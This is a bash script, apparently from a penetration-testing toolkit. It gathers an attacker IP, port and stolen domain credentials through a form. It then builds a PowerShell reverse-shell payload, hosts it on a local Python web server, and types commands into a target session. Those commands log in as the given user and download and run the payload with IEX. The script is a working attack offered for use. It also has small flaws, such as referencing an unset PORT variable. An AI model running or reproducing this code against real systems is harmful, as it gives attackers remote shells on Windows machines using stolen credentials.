#!/bin/bash

: '
ps: login as user and create reverse shell
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
LHOST_FIELD=$(form_item  "LHOST"  "lhost" "${KALI_IP}")
HTTP_PORT_FIELD=$(form_item  "port" "number" "http_port" "1337")
WEBSITE_IP_FIELD=$(form_item  "website ip" "website_ip" "${KALI_IP}")
DOMAIN_FIELD=$(form_item  "domain" "domain")
USERNAME_FIELD=$(form_item  "username" "username")
PASSWORD_FIELD=$(form_item  "password" "password")
DOMAIN_FIELD=$(form_item  "domain" "domain")

# Generate GUI form
generate_form "${LHOST_FIELD}" "${HTTP_PORT_FIELD}" "${WEBSITE_IP_FIELD}" "${DOMAIN_FIELD}" "${USERNAME_FIELD}" "${PASSWORD_FIELD}"

LHOST=${form_data["lhost"]}
HTTP_PORT=${form_data["http_port"]}
WEBSITE_IP=${form_data["website_ip"]}
DOMAIN=${form_data["domain"]}
USERNAME=${form_data["username"]}
PASSWORD=${form_data["password"]}

LOCATION="${SCRIPTS_DIR}/shell/windows/.files"
SRC_FILE="${FILES_FOLDER}/Invoke-PowerShellTc.ps1"
TMP_FILE="${FILES_FOLDER}/Invoke-PowerShellTc-shell.ps1"

cp "${SRC_FILE}" "${TMP_FILE}"
echo "Invoke-PowerShellTcp -Reverse -IPAddress ${LHOST} -Port ${PORT}" >> "${TMP_FILE}"


# start python server: location, python http port, TTL time (default: 60)
start_python_server "${LOCATION}" "${HTTP_PORT}"

execute_command "\$username = '${DOMAIN}\\${USERNAME}'"
create_new_line
sleep 0.8

execute_command "\$password = '${PASSWORD}'"
create_new_line
sleep 0.8

execute_command "\$securePassword = ConvertTo-SecureString \$password -AsPlainText -Force"
create_new_line
sleep 0.8

execute_command "\$credential = New-Object System.Management.Automation.PSCredential \$username, \$securePassword"
create_new_line
sleep 0.8

execute_command "Start-Process powershell.exe -Credential \$credential -ArgumentList \"(New-Object Net.WebClient).DownloadString('http://${WEBSITE_IP}:${HTTP_PORT}/Invoke-PowerShellTc-shell.ps1') | IEX; sleep 1000\""
create_new_line
sleep 0.8
